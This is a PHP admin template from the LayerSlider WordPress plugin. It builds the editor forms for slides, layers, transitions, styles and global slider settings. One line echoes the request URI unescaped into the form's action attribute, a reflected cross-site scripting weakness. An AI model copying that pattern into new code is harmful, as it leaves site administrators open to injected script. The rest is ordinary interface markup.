					<td class="right"><?php _e('Deeplink', 'LayerSlider') ?></td>
					<td><input type="text" name="deeplink" data-help="<?php _e('You can specify a slide alias name which you can use in your URLs with a hash mark, so LayerSlider will start with the correspondig slide.', 'LayerSlider') ?>"></td>
					<td class="right"><?php _e('Hidden', 'LayerSlider') ?></td>
					<td><input type="checkbox" name="skip" class="checkbox" data-help="<?php _e("If you don't want to use this slide in your front-page, but you want to keep it, you can hide it with this switch.", "LayerSlider") ?>"></td>
				</tr>
			</tbody>
		</table>
		<table>
			<thead>
				<tr>
					<td>
						<span id="ls-icon-preview"></span>
						<h4><?php _e('Preview', 'LayerSlider') ?></h4>
					</td>
				</tr>
			</thead>
			<tbody>
				<tr>
					<td class="ls-preview-td">
						<div class="ls-preview-wrapper">
							<div class="ls-preview">
								<div class="draggable ls-layer"></div>
							</div>
							<div class="ls-real-time-preview"></div>
							<button class="button ls-preview-button"><?php _e('Enter Preview', 'LayerSlider') ?></button>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
		<table>
			<thead>
				<tr>
					<td>
						<span id="ls-icon-sublayers"></span>
						<h4><?php _e('Layers', 'LayerSlider') ?></h4>
					</td>
				</tr>
			</thead>
			<tbody class="ls-sublayers ls-sublayer-sortable">
				<tr>
					<td>
						<div class="ls-sublayer-wrapper">
							<span class="ls-sublayer-number">1</span>
							<span class="ls-highlight"><input type="checkbox" class="noreplace"></span>
							<span class="ls-icon-eye"></span>
							<span class="ls-icon-lock"></span>
							<input type="text" name="subtitle" class="ls-sublayer-title" value="Layer #1">
							<div class="clear"></div>
							<div class="ls-sublayer-nav">
								<a href="#" class="active"><?php _e('Basic', 'LayerSlider') ?></a>
								<a href="#"><?php _e('Options', 'LayerSlider') ?></a>
								<a href="#"><?php _e('Link', 'LayerSlider') ?></a>
								<a href="#"><?php _e('Style', 'LayerSlider') ?></a>
								<a href="#"><?php _e('Attributes', 'LayerSlider') ?></a>
								<a href="#" title="<?php _e('Remove this layer', 'LayerSlider') ?>" class="remove">x</a>
							</div>
							<div class="ls-sublayer-pages">
								<div class="ls-sublayer-page ls-sublayer-basic active">
									<select name="type">
										<option selected="selected">img</option>
										<option>div</option>
										<option>p</option>
										<option>span</option>
										<option>h1</option>
										<option>h2</option>
										<option>h3</option>
										<option>h4</option>
										<option>h5</option>
										<option>h6</option>
									</select>

									<div class="ls-sublayer-types">
										<span class="ls-type">
											<span class="ls-icon-img"></span><br>
											<?php _e('Image', 'LayerSlider') ?>
										</span>

										<span class="ls-type">
											<span class="ls-icon-div"></span><br>
											<?php _e('Div / Video', 'LayerSlider') ?>
										</span>

										<span class="ls-type">
											<span class="ls-icon-p"></span><br>
											<?php _e('Paragraph', 'LayerSlider') ?>
										</span>

										<span class="ls-type">
											<span class="ls-icon-span"></span><br>
											<?php _e('Span', 'LayerSlider') ?>
										</span>

										<span class="ls-type">
											<span class="ls-icon-h1"></span><br>
											<?php _e('H1', 'LayerSlider') ?>
										</span>

										<span class="ls-type">
											<span class="ls-icon-h2"></span><br>
											<?php _e('H2', 'LayerSlider') ?>
										</span>

										<span class="ls-type">
											<span class="ls-icon-h3"></span><br>
											<?php _e('H3', 'LayerSlider') ?>
										</span>

										<span class="ls-type">
											<span class="ls-icon-h4"></span><br>
											<?php _e('H4', 'LayerSlider') ?>
										</span>

										<span class="ls-type">
											<span class="ls-icon-h5"></span><br>
											<?php _e('H5', 'LayerSlider') ?>
										</span>

										<span class="ls-type">
											<span class="ls-icon-h6"></span><br>
											<?php _e('H6', 'LayerSlider') ?>
										</span>
									</div>

									<div class="ls-image-uploader">
										<img src="<?php echo $GLOBALS['lsPluginPath'].'/img/transparent.png' ?>" alt="layer image">
										<input type="text" name="image" class="<?php echo $uploadClass ?>" value="">
										<p>
											<?php _e('Click into this text field to open WordPress Media Library where you can upload new images or select previously used ones.', 'LayerSlider') ?>
										</p>
									</div>

									<div class="ls-html-code">
										<h5><?php _e('Custom HTML content', 'LayerSlider') ?></h5>
										<textarea name="html" cols="50" rows="5" data-help="<?php _e('Type here the contents of your layer. You can use any HTML codes in this field to insert other contents then text. This field is also shortcode-aware, so you can insert content from other plugins as well as video embed codes.', 'LayerSlider') ?>"></textarea>
									</div>
								</div>
								<div class="ls-sublayer-page ls-sublayer-options">
									<table>
										<tbody>
											<tr>
												<td rowspan="2"><?php _e('Transition in', 'LayerSlider') ?></td>
												<td class="right"><?php _e('Type', 'LayerSlider') ?></td>
												<td>
													<select name="slidedirection" class="sublayerprop" data-help="<?php _e('The type of the transition.', 'LayerSlider') ?>">
														<option value="fade"><?php _e('Fade', 'LayerSlider') ?></option>
														<option value="auto" selected="selected"><?php _e('Auto (Slide from auto direction)', 'LayerSlider') ?></option>
														<option value="top"><?php _e('Top (Slide from top)', 'LayerSlider') ?></option>
														<option value="right"><?php _e('Right (Slide from right)', 'LayerSlider') ?></option>
														<option value="bottom"><?php _e('Bottom (Slide from bottom)', 'LayerSlider') ?></option>
														<option value="left"><?php _e('Left (Slide from left)', 'LayerSlider') ?></option>
													</select>
												</td>
												<td class="right"><?php _e('Duration', 'LayerSlider') ?></td>
												<td><input type="text" name="durationin" class="sublayerprop" value="1000" data-help="<?php _e('The duration of the slide in animation. This value is in millisecs, so the value 1000 means 1 second. Lower values results faster animations.', 'LayerSlider') ?>"> (ms)</td>
												<td class="right"><a href="http://easings.net/" target="_blank"><?php _e('Easing', 'LayerSlider') ?></a></td>
												<td>
													<select name="easingin" class="sublayerprop" data-help="<?php _e('The timing function of the animation, with it you can manipualte the layer movement. Please click on the link next to this select field to open easings.net for more information and real-time examples.', 'LayerSlider') ?>">
														<option>linear</option>
														<option>swing</option>
														<option>easeInQuad</option>
														<option>easeOutQuad</option>
														<option>easeInOutQuad</option>
														<option>easeInCubic</option>
														<option>easeOutCubic</option>
														<option>easeInOutCubic</option>
														<option>easeInQuart</option>
														<option>easeOutQuart</option>
														<option>easeInOutQuart</option>
														<option>easeInQuint</option>
														<option>easeOutQuint</option>
														<option selected="selected">easeInOutQuint</option>
														<option>easeInSine</option>
														<option>easeOutSine</option>
														<option>easeInOutSine</option>
														<option>easeInExpo</option>
														<option>easeOutExpo</option>
														<option>easeInOutExpo</option>
														<option>easeInCirc</option>
														<option>easeOutCirc</option>
														<option>easeInOutCirc</option>
														<option>easeInElastic</option>
														<option>easeOutElastic</option>
														<option>easeInOutElastic</option>
														<option>easeInBack</option>
														<option>easeOutBack</option>
														<option>easeInOutBack</option>
														<option>easeInBounce</option>
														<option>easeOutBounce</option>
														<option>easeInOutBounce</option>
													</select>
												</td>
												<td class="right"><?php _e('Delay', 'LayerSlider') ?></td>
												<td><input type="text" name="delayin" class="sublayerprop" value="0" data-help="<?php _e('Delay before the animation start when the layer slides in. This value is in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
											</tr>
											<tr>
												<td class="right notfirst"><?php _e('Rotation', 'LayerSlider') ?></td>
												<td><input type="text" name="rotatein" value="0" class="sublayerprop" data-help="You can set the initial rotation of this layer here which will animate to the default (0deg) value. You can use negative values."></td>
												<td class="right"><?php _e('Scale', 'LayerSlider') ?></td>
												<td><input type="text" name="scalein" value="1.0" class="sublayerprop" data-help="You can set the initial scale of this layer here which will be animated to the default (1.0) value."></td>
												<td class="right"></td>
												<td></td>
												<td class="right"></td>
												<td></td>
											</tr>

											<tr>
												<td rowspan="2"><?php _e('Transition out', 'LayerSlider') ?></td>
												<td class="right"><?php _e('Type', 'LayerSlider') ?></td>
												<td>
													<select name="slideoutdirection" class="sublayerprop" data-help="<?php _e('The type of the transition.', 'LayerSlider') ?>">
														<option value="fade"><?php _e('Fade', 'LayerSlider') ?></option>
														<option value="auto" selected="selected"><?php _e('Auto (Slide to auto direction)', 'LayerSlider') ?></option>
														<option value="top"><?php _e('Top (Slide to top)', 'LayerSlider') ?></option>
														<option value="right"><?php _e('Right (Slide to right)', 'LayerSlider') ?></option>
														<option value="bottom"><?php _e('Bottom (Slide to bottom)', 'LayerSlider') ?></option>
														<option value="left"><?php _e('Left (Slide to left)', 'LayerSlider') ?></option>
													</select>
												</td>
												<td class="right"><?php _e('Duration', 'LayerSlider') ?></td>
												<td><input type="text" name="durationout" class="sublayerprop" value="1000" data-help="<?php _e('The duration of the slide out animation. This value is in millisecs, so the value 1000 means 1 second. Lower values results faster animations.', 'LayerSlider') ?>"> (ms)</td>
												<td class="right"><a href="http://easings.net/" target="_blank"><?php _e('Easing', 'LayerSlider') ?></a></td>
												<td>
													<select name="easingout" class="sublayerprop" data-help="<?php _e('The timing function of the animation, with it you can manipualte the layer movement. Please click on the link next to this select field to open easings.net for more information and real-time examples.', 'LayerSlider') ?>">
														<option>linear</option>
														<option>swing</option>
														<option>easeInQuad</option>
														<option>easeOutQuad</option>
														<option>easeInOutQuad</option>
														<option>easeInCubic</option>
														<option>easeOutCubic</option>
														<option>easeInOutCubic</option>
														<option>easeInQuart</option>
														<option>easeOutQuart</option>
														<option>easeInOutQuart</option>
														<option>easeInQuint</option>
														<option>easeOutQuint</option>
														<option selected="selected">easeInOutQuint</option>
														<option>easeInSine</option>
														<option>easeOutSine</option>
														<option>easeInOutSine</option>
														<option>easeInExpo</option>
														<option>easeOutExpo</option>
														<option>easeInOutExpo</option>
														<option>easeInCirc</option>
														<option>easeOutCirc</option>
														<option>easeInOutCirc</option>
														<option>easeInElastic</option>
														<option>easeOutElastic</option>
														<option>easeInOutElastic</option>
														<option>easeInBack</option>
														<option>easeOutBack</option>
														<option>easeInOutBack</option>
														<option>easeInBounce</option>
														<option>easeOutBounce</option>
														<option>easeInOutBounce</option>
													</select>
												</td>
												<td class="right"><?php _e('Delay', 'LayerSlider') ?></td>
												<td><input type="text" name="delayout" class="sublayerprop" value="0" data-help="<?php _e('Delay before the animation start when the layer slides out. This value is in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
											</tr>

											<tr>
												<td class="right notfirst"><?php _e('Rotation', 'LayerSlider') ?></td>
												<td><input type="text" name="rotateout" value="0" class="sublayerprop" data-help="You can set the ending rotation here, this sublayer will be animated from the default (0deg) value to yours. You can use negative values."></td>
												<td class="right"><?php _e('Scale', 'LayerSlider') ?></td>
												<td><input type="text" name="scaleout" value="1.0" class="sublayerprop" data-help="You can set the ending scale value here, this sublayer will be animated from the default (1.0) value to yours."></td>
												<td class="right"></td>
												<td></td>
												<td class="right"></td>
												<td></td>
											</tr>

											<tr>
												<td><?php _e('Other options', 'LayerSlider') ?></td>
												<td class="right"><?php _e('Distance', 'LayerSlider') ?></td>
												<td><input type="text" name="level" value="-1" data-help="<?php _e('The default value is -1 which means that the layer will be positioned exactly outside of the slide container. You can use the default setting in most of the cases. If you need to set the start or end position of the layer from further of the edges of the slide container, you can use 2, 3 or higher values.', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Show until', 'LayerSlider') ?></td>
												<td><input type="text" name="showuntil" class="sublayerprop" value="0" data-help="<?php _e('The layer will be visible for the time you specify here, then it will slide out. You can use this setting for layers to leave the slide before the slide itself animates out, or for example before other layers will slide in. This value in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
												<td class="right"><?php _e('Hidden', 'LayerSlider') ?></td>
												<td><input type="checkbox" name="skip" class="checkbox" data-help="<?php _e("If you don't want to use this layer, but you want to keep it, you can hide it with this switch.", "LayerSlider") ?>"></td>
												<td colspan="3"><button class="button duplicate" data-help="<?php _e('If you will use similar settings for other layers or you want to experiment on a copy, you can duplicate this layer.', 'LayerSlider') ?>"><?php _e('Duplicate this layer', 'LayerSlider') ?></button></td>
											</tr>
									</table>
								</div>
								<div class="ls-sublayer-page ls-sublayer-link">
									<table>
										<tbody>
											<tr>
												<td><?php _e('URL', 'LayerSlider') ?></td>
												<td class="url"><input type="text" name="url" value="" data-help="<?php _e('If you want to link your layer, type here the URL. You can use a hash mark followed by a number to link this layer to another slide. Example: #3 - this will switch to the third slide.', 'LayerSlider') ?>"></td>
												<td>
													<select name="target" data-help="<?php _e('You can control here the link behaviour: _self means the linked page will open in the current tab/window, _blank will open it in a new tab/window.', 'LayerSlider') ?>">
														<option>_self</option>
														<option>_blank</option>
														<option>_parent</option>
														<option>_top</option>
													</select>
												</td>
											</tr>
										</tbody>
									</table>
								</div>
								<div class="ls-sublayer-page ls-sublayer-style">
									<input type="hidden" name="styles">
									<table>
										<tbody>
											<tr>
												<td><?php _e('Layout & Positions', 'LayerSlider') ?></td>
												<td class="right"><?php _e('Width', 'LayerSlider') ?></td>
												<td><input type="text" name="width" class="auto" value="" data-help="<?php _e("You can set the width of your layer. You can use pixels, percents, or the default value 'auto'. Examples: 100px, 50% or auto", "LayerSlider") ?>"></td>
												<td class="right"><?php _e('Height', 'LayerSlider') ?></td>
												<td><input type="text" name="height" class="auto" value="" data-help="<?php _e("You can set the height of your layer. You can use pixels, percents, or the default value 'auto'. Examples: 100px, 50% or auto", "LayerSlider") ?>"></td>
												<td class="right"><?php _e('Top', 'LayerSlider') ?></td>
												<td><input type="text" name="top" value="0px" data-help="<?php _e("The layer position from the top of the slide. You can use pixels and percents. Examples: 100px or 50%. You can move your layers in the preview above with a drag n' drop, or set the exact values here.", "LayerSlider") ?>"></td>
												<td class="right"><?php _e('Left', 'LayerSlider') ?></td>
												<td><input type="text" name="left" value="0px" data-help="<?php _e("The layer position from the left side of the slide. You can use pixels and percents. Examples: 100px or 50%. You can move your layers in the preview above with a drag n' drop, or set the exact values here.", "LayerSlider") ?>"></td>
											</tr>
											<tr>
												<td><?php _e('Padding', 'LayerSlider') ?></td>
												<td class="right"><?php _e('Top', 'LayerSlider') ?></td>
												<td><input type="text" name="padding-top" class="auto" value="" data-help="<?php _e('Padding on the top of the layer. Example: 10px', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Right', 'LayerSlider') ?></td>
												<td><input type="text" name="padding-right" class="auto" value="" data-help="<?php _e('Padding on the right side of the layer. Example: 10px', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Bottom', 'LayerSlider') ?></td>
												<td><input type="text" name="padding-bottom" class="auto" value="" data-help="<?php _e('Padding on the bottom of the layer. Example: 10px', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Left', 'LayerSlider') ?></td>
												<td><input type="text" name="padding-left" class="auto" value="" data-help="<?php _e('Padding on the left side of the layer. Example: 10px', 'LayerSlider') ?>"></td>
											</tr>
											<tr>
												<td><?php _e('Border', 'LayerSlider') ?></td>
												<td class="right"><?php _e('Top', 'LayerSlider') ?></td>
												<td><input type="text" name="border-top" class="auto" value="" data-help="<?php _e('Border on the top of the layer. Example: 5px solid #000', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Right', 'LayerSlider') ?></td>
												<td><input type="text" name="border-right" class="auto" value="" data-help="<?php _e('Border on the right side of the layer. Example: 5px solid #000', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Bottom', 'LayerSlider') ?></td>
												<td><input type="text" name="border-bottom" class="auto" value="" data-help="<?php _e('Border on the bottom of the layer. Example: 5px solid #000', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Left', 'LayerSlider') ?></td>
												<td><input type="text" name="border-left" class="auto" value="" data-help="<?php _e('Border on the left side of the layer. Example: 5px solid #000', 'LayerSlider') ?>"></td>
											</tr>
											<tr>
												<td><?php _e('Font', 'LayerSlider') ?></td>
												<td class="right"><?php _e('Family', 'LayerSlider') ?></td>
												<td><input type="text" name="font-family" class="auto" value="" data-help="<?php _e('List of your chosen fonts separated with a comma. Please use apostrophes if your font names contains white spaces. Example: Helvetica, Arial, sans-serif', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Size', 'LayerSlider') ?></td>
												<td><input type="text" name="font-size" class="auto" value="" data-help="<?php _e('The font size in pixels. Example: 16px.', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Line-height', 'LayerSlider') ?></td>
												<td><input type="text" name="line-height" class="auto" value="" data-help="<?php _e("The line height of your text. The default setting is 'normal'. Example: 22px", "LayerSlider") ?>"></td>
												<td class="right"><?php _e('Color', 'LayerSlider') ?></td>
												<td><input type="text" name="color" class="auto ls-colorpicker" value="" data-help="<?php _e('The color of your text. You can use color names, hexadecimal, RGB or RGBA values. Example: #333', 'LayerSlider') ?>"></td>
											</tr>
											<tr>
												<td><?php _e('Misc', 'LayerSlider') ?></td>
												<td class="right"><?php _e('Background', 'LayerSlider') ?></td>
												<td><input type="text" name="background" class="auto ls-colorpicker" value="" data-help="<?php _e("The background color of your layer. You can use color names, hexadecimal, RGB or RGBA values as well as the 'transparent' keyword. Example: #FFF", "LayerSlider") ?>"></td>
												<td class="right"><?php _e('Rounded corners', 'LayerSlider') ?></td>
												<td><input type="text" name="border-radius" class="auto" value="" data-help="<?php _e('If you want rounded corners, you can set here its radius. Example: 5px', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Word-wrap', 'LayerSlider') ?></td>
												<td colspan="3"><input type="checkbox" name="wordwrap" class="checkbox" data-help="<?php _e('If you use custom sized layers, you have to enable this setting to wrap your text.', 'LayerSlider') ?>"></td>
											</tr>
											<tr>
												<td><?php _e('Custom style settings', 'LayerSlider') ?></td>
												<td class="right"><?php _e('Custom styles', 'LayerSlider') ?></td>
												<td colspan="7"><textarea rows="5" cols="50" name="style" class="style" data-help="<?php _e('If you want to set style settings other then above, you can use here any CSS codes. Please make sure to write valid markup.', 'LayerSlider') ?>"></textarea></td>
											</tr>
										</tbody>
									</table>
								</div>
								<div class="ls-sublayer-page ls-sublayer-attributes">
									<table>
										<tbody>
											<tr>
												<td><?php _e('Attributes', 'LayerSlider') ?></td>
												<td class="right"><?php _e('ID', 'LayerSlider') ?></td>
												<td><input type="text" name="id" value="" data-help="<?php _e('You can apply an ID attribute on the HTML element of this layer to work with it in your custom CSS or Javascript code.', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Classes', 'LayerSlider') ?></td>
												<td><input type="text" name="class" value="" data-help="<?php _e('You can apply classes on the HTML element of this layer to work with it in your custom CSS or Javascript code.', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Title', 'LayerSlider') ?></td>
												<td><input type="text" name="title" value="" data-help="<?php _e('You can add a title to this layer which will display as a tooltip if someone holds his mouse cursor over the layer.', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Alt', 'LayerSlider') ?></td>
												<td><input type="text" name="alt" value="" data-help="<?php _e('You can add an alternative text to your layer which is indexed by search engine robots and it helps people with certain disabilities.', 'LayerSlider') ?>"></td>
												<td class="right"><?php _e('Rel', 'LayerSlider') ?></td>
												<td><input type="text" name="rel" value="" data-help="<?php _e('Some plugin may use the rel attribute of a linked content, here you can specify it to make interaction with these plugins.', 'LayerSlider') ?>"></td>
											</tr>
										</tbody>
									</table>
								</div>
							</div>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
		<a href="#" class="ls-add-sublayer"><?php _e('Add new layer', 'LayerSlider') ?></a>
	</div>
</div>

<form action="<?php echo $_SERVER['REQUEST_URI'] ?>" method="post" class="wrap" id="ls-slider-form">

	<input type="hidden" name="posted_add" value="1">

	<!-- Title -->
	<div class="ls-icon-layers"></div>
	<h2>
		<?php _e('Add new LayerSlider', 'LayerSlider') ?>
		<a href="?page=layerslider" class="add-new-h2"><?php _e('Back to the list', 'LayerSlider') ?></a>
	</h2>

	<!-- Main menu bar -->
	<div id="ls-main-nav-bar">
		<a href="#" class="settings active"><?php _e('Global Settings', 'LayerSlider') ?></a>
		<a href="#" class="layers"><?php _e('Slides', 'LayerSlider') ?></a>
		<a href="#" class="callbacks"><?php _e('Event Callbacks', 'LayerSlider') ?></a>
		<a href="http://support.kreaturamedia.com/faq/4/layerslider-for-wordpress/" target="_blank" class="faq right unselectable"><?php _e('FAQ', 'LayerSlider') ?></a>
		<a href="#" class="help right unselectable support"><?php _e('Documentation', 'LayerSlider') ?></a>
		<span class="right help">Need help? Try these:</span>
		<a href="#" class="clear unselectable"></a>
	</div>

	<!-- Pages -->
	<div id="ls-pages">

		<!-- Global Settings -->
		<div class="ls-page ls-settings active">

			<div id="post-body-content">
				<div id="titlediv">
					<div id="titlewrap">
						<input type="text" name="title" value="" id="title" autocomplete="off" placeholder="<?php _e('Type your slider name here', 'LayerSlider') ?>">
					</div>
				</div>
			</div>

			<div class="ls-box ls-settings">
				<h3 class="header"><?php _e('Global Settings', 'LayerSlider') ?></h3>
				<table>
					<thead>
						<tr>
							<td colspan="3">
								<span id="ls-icon-basic"></span>
								<h4><?php _e('Basic', 'LayerSlider') ?></h4>
							</td>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td><?php _e('Width', 'LayerSlider') ?></td>
							<td><input type="text" name="width" value="600" class="input"></td>
							<td class="desc">(px) <?php _e('The slider width in pixels. For compatibility reasons, we still support percentage values, but for responsive layout, you should use pixels.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Height', 'LayerSlider') ?></td>
							<td><input type="text" name="height" value="300" class="input"></td>
							<td class="desc">(px) <?php _e('The slider height in pixels.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Responsive', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="responsive" checked="checked"></td>
							<td class="desc"><?php _e('Enable this option to turn LayerSlider into a responsive slider.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Full-width slider', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="forceresponsive"></td>
							<td class="desc"><?php _e('When you are using a responsiveness or percentage dimensions for the slider, it will respond the parent element size changes. With this option you can bypass this behaviour and LayerSlider will be a full-width slider.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Responsive under', 'LayerSlider') ?></td>
							<td><input type="text" name="responsiveunder" value="0"></td>
							<td class="desc">(px) <?php _e('You can force the slider to change automatically into responsive mode but only if the slider width is smaller than responsiveUnder pixels. It can be used if you need a full-width slider with fixed height but you also need it to be responsive if the browser is smaller... Important! If you enter a value higher than 0, the normal responsive mode will be switched off automatically!', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Layers Container', 'LayerSlider') ?></td>
							<td><input type="text" name="sublayercontainer" value="0"></td>
							<td class="desc">(px) <?php _e("This feature is useful if you are using a full-width slider and you want to avoid stretching your layers across the full viewport horizontally. Just specify a custom width in pixels, and the slider will create a centered inner area to place your content into that. Note that this feature is working only with pixel-positioned layers, but you can still use the value '50%' if you want centered positions.", "LayerSlider") ?></td>
						</tr>
					</tbody>
					<thead>
						<tr>
							<td colspan="3">
								<span id="ls-icon-slideshow"></span>
								<h4><?php _e('Slideshow', 'LayerSlider') ?></h4>
							</td>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td><?php _e('Automatically start slideshow', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="autostart" checked="checked"></td>
							<td class="desc"><?php _e('If enabled, slideshow will automatically start after loading the page.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Pause on hover', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="pauseonhover" checked="checked"></td>
							<td class="desc"><?php _e('Slideshow will pause when mouse pointer is over LayerSlider.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('First slide', 'LayerSlider') ?></td>
							<td><input type="text" name="firstlayer" value="1" class="input"></td>
							<td class="desc"><?php _e('LayerSlider will start with this slide (you can type the word <i>random</i> if you want the slider to start with a random slide).', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Animate first slide', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="animatefirstlayer" checked="checked"></td>
							<td class="desc"><?php _e('If enabled, the layers of the first slide will animate (slide in) instead of fading in with the slide.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Random slideshow', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="randomslideshow"></td>
							<td class="desc"><?php _e("LayerSlider will change to a random slide instead of changing to the next / prev slide. Note that 'loops' feature won't work with this option.", "LayerSlider") ?></td>
						</tr>
						<tr>
							<td><?php _e('Two way slideshow', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="twowayslideshow" checked="checked"></td>
							<td class="desc"><?php _e('If enabled, slideshow will go backwards if you click the prev button.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Loops', 'LayerSlider') ?></td>
							<td>
								<select name="loops">
									<?php for($c = 0; $c < 11; $c++) : ?>
									<option><?php echo $c ?></option>
									<?php endfor; ?>
								</select>
							</td>
							<td class="desc"><?php _e('Number of loops if automatically start slideshow is enabled (0 means infinite!)', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Force the number of loops', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="forceloopnum" checked="checked"></td>
							<td class="desc"><?php _e('If enabled, the slider will always stop at the given number of loops even if the user restarts the slideshow.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Automatically play videos', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="autoplayvideos" checked="checked"></td>
							<td class="desc"><?php _e('If enabled, the slider will automatically play youtube and vimeo videos.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Automatically pause slideshow', 'LayerSlider') ?></td>
							<td>
								<select name="autopauseslideshow">
									<option value="auto"><?php _e('auto', 'LayerSlider') ?></option>
									<option value="enabled"><?php _e('enabled', 'LayerSlider') ?></option>
									<option value="disabled"><?php _e('disabled', 'LayerSlider') ?></option>
								</select>
							</td>
							<td class="desc"><?php _e("If you enabled the 'automatically play videos' option, the 'auto' value means that the slideshow will pause UNTIL the video is finished playing and after that it will continue. The 'enabled' value means that the slideshow will stop and will not resume after the video has been played.", "LayerSlider") ?></td>
						</tr>
						<tr>
							<td><?php _e('Youtube preview', 'LayerSlider') ?></td>
							<td>
								<select name="youtubepreview">
									<option value="maxresdefault.jpg"><?php _e('Maximum quality', 'LayerSlider') ?></option>
									<option value="hqdefault.jpg"><?php _e('High quality', 'LayerSlider') ?></option>
									<option value="mqdefault.jpg"><?php _e('Medium quality', 'LayerSlider') ?></option>
									<option value="default.jpg"><?php _e('Default quality', 'LayerSlider') ?></option>
								</select>
							</td>
							<td class="desc"><?php _e('Default thumbnail picture of YouTube videos. Note, that Maximum quaility is not available to all (not HD) videos.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Keyboard navigation', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="keybnav" checked="checked"></td>
							<td class="desc"><?php _e('You can navigate with the left and right arrow keys.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Touch navigation', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="touchnav" checked="checked"></td>
							<td class="desc"><?php _e('Touch-control (on mobile devices).', 'LayerSlider') ?></td>
						</tr>
					</tbody>
					<thead>
						<tr>
							<td colspan="3">
								<span id="ls-icon-appearance"></span>
								<h4><?php _e('Appearance', 'LayerSlider') ?></h4>
							</td>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td><?php _e('Skin', 'LayerSlider') ?></td>
							<td>
								<select name="skin">
									<?php $skins = array_map('basename', glob(dirname(__FILE__) . '/skins/*', GLOB_ONLYDIR)); ?>
									<?php foreach($skins as $skin) : ?>
									<?php $selected = ($skin == 'defaultskin') ? ' selected="selected"' : '' ?>
									<option<?php echo $selected ?>><?php echo $skin ?></option>
									<?php endforeach; ?>
								</select>
							</td>
							<td class="desc"><?php _e("You can change the skin of the slider. The 'noskin' skin is a border- and buttonless skin. Your custom skins will appear in the list when you create their folders as well.", "LayerSlider") ?></td>
						</tr>
						<tr>
							<td><?php _e('Background color', 'LayerSlider') ?></td>
							<td>
								<div class="reset-parent">
									<input type="text" name="backgroundcolor" value="" class="input ls-colorpicker">
								</div>
							</td>
							<td class="desc"><?php _e('Background color of LayerSlider. You can use all CSS methods, like hexa colors, rgb(r,g,b) method, color names, etc. Note, that slides with background will cover up the global background image.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Background image', 'LayerSlider') ?></td>
							<td>
								<div class="reset-parent">
									<input type="text" name="backgroundimage" class="input ls-upload">
									<span class="ls-reset">x</span>
								</div>
							</td>
							<td class="desc"><?php _e('Background image of LayerSlider. This will be a fixed background image of LayerSlider by default. Note, that slides with background will cover up the global background image.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Slider style', 'LayerSlider') ?></td>
							<td>
								<div class="reset-parent">
									<input type="text" name="sliderstyle" class="input">
									<span class="ls-reset">x</span>
								</div>
							</td>
							<td class="desc"><?php _e('Here you can apply your custom CSS style settings to the slider.', 'LayerSlider') ?></td>
						</tr>
					</tbody>
					<thead>
						<tr>
							<td colspan="3">
								<span id="ls-icon-nav"></span>
								<h4><?php _e('Navigation', 'LayerSlider') ?></h4>
							</td>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td><?php _e('Prev and Next buttons', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="navprevnext" checked="checked"></td>
							<td class="desc"><?php _e('If disabled, Prev and Next buttons will be invisible.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Start and Stop buttons', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="navstartstop" checked="checked"></td>
							<td class="desc"><?php _e('If disabled, Start and Stop buttons will be invisible.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Navigation buttons', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="navbuttons" checked="checked"></td>
							<td class="desc"><?php _e('If disabled, slide buttons will be invisible.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Prev and next buttons on hover', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="hoverprevnext" checked="checked"></td>
